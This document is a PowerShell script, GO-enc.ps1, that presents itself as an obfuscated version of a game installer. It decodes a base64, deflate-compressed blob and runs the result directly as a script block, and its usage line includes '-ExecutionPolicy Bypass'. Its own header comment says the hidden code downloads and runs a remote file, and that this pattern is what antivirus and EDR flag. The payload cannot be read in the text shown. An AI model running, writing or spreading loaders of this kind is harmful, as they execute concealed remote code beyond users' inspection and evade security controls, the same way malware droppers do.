<#
    GO-enc.ps1 - the same installer as GO.ps1, stored compressed and encoded.

    This is OBFUSCATION, not encryption. There is no key, because any key would
    have to travel inside this file and would therefore be readable. What it buys
    is that nobody can read or casually edit the logic by opening it in Notepad.

    Warning: encoded PowerShell that downloads and executes a remote file is
    exactly the pattern AMSI / Defender / EDR flag as malicious. The plain GO.ps1
    is less likely to be blocked.

    Usage:  powershell -NoProfile -ExecutionPolicy Bypass -File GO-enc.ps1
            powershell -NoProfile -ExecutionPolicy Bypass -File GO-enc.ps1 -GameOnly
#>
param([switch]$GameOnly)

$ErrorActionPreference = 'Stop'
$env:GOSELF = $MyInvocation.MyCommand.Path

$blob = @'
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
'@

$raw  = [Convert]::FromBase64String(($blob -replace '\s', ''))
$mem  = New-Object System.IO.MemoryStream
$mem.Write($raw, 0, $raw.Length)
$mem.Position = 0
$infl = New-Object System.IO.Compression.DeflateStream($mem, [IO.Compression.CompressionMode]::Decompress)
$sr   = New-Object System.IO.StreamReader($infl, [Text.Encoding]::UTF8)
$code = $sr.ReadToEnd()
$sr.Close(); $infl.Close(); $mem.Close()

$sb = [scriptblock]::Create($code)
if ($GameOnly) { & $sb -GameOnly } else { & $sb }